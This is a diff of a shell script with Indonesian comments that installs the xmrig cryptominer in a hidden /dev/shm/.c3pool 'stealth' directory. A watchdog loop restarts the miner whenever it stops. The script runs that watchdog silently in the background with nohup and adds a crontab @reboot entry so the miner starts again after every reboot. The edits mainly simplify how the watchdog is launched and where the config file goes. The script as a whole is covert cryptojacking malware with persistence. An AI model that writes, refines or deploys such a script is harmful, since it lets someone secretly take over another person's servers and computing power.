@@ -39,8 +39,8 @@ if ! "$BIN_PATH" --help > /dev/null 2>&1; then
 fi
 echo "$BIN_PATH" > "$MINER_SUBDIR/.binpath"
 
-# ===== Buat konfigurasi =====
-cat > config_background.json <<EOF
+# ===== Buat konfigurasi mining =====
+cat > "$MINER_SUBDIR/config_background.json" <<EOF
 {
     "autosave": true,
     "background": true,
@@ -70,7 +70,7 @@ LOGFILE="/dev/shm/.c3pool/c3pool/xmrig.log"
 while true; do
     if ! pgrep -f "$BIN" > /dev/null; then
         echo "[$(date)] xmrig tidak berjalan. Memulai ulang..." >> "$LOGFILE"
-        "$BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 &
+        "$BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 || echo "[$(date)] Gagal menjalankan xmrig!" >> "$LOGFILE"
     fi
     sleep 30
 done
@@ -79,19 +79,12 @@ EOF
 chmod +x "$STEALTH_DIR/watchdog.sh"
 pkill -f "$STEALTH_DIR/watchdog.sh" 2>/dev/null
 
-# ===== Jalankan Watchdog =====
+# ===== Jalankan Watchdog di Background =====
 echo "[*] Menjalankan watchdog di background..."
-
-if command -v bash >/dev/null 2>&1; then
-    CMD="bash \"$STEALTH_DIR/watchdog.sh\""
-else
-    CMD="sh \"$STEALTH_DIR/watchdog.sh\""
-fi
-
 if command -v nohup >/dev/null 2>&1; then
-    eval "nohup $CMD > /dev/null 2>&1 &"
+    nohup bash "$STEALTH_DIR/watchdog.sh" > /dev/null 2>&1 &
 else
-    eval "$CMD > /dev/null 2>&1 &"
+    bash "$STEALTH_DIR/watchdog.sh" > /dev/null 2>&1 &
 fi
 
 # ===== Verifikasi Watchdog =====
@@ -102,12 +95,13 @@ else
     echo "[!] Gagal menjalankan watchdog!"
 fi
 
-# ===== Tambahkan ke crontab jika ada =====
+# ===== Tambahkan ke Crontab (Auto Start) =====
 if command -v crontab >/dev/null 2>&1; then
-    (crontab -l 2>/dev/null; echo "@reboot $CMD > /dev/null 2>&1 &") | crontab -
+    (crontab -l 2>/dev/null; echo "@reboot bash $STEALTH_DIR/watchdog.sh > /dev/null 2>&1 &") | crontab -
     echo "[*] Cron @reboot ditambahkan."
 else
     echo "[!] crontab tidak ditemukan. Lewati autostart."
 fi
 
+# ===== Selesai =====
 echo "[✓] Selesai. xmrig disimpan di: $BIN_PATH"
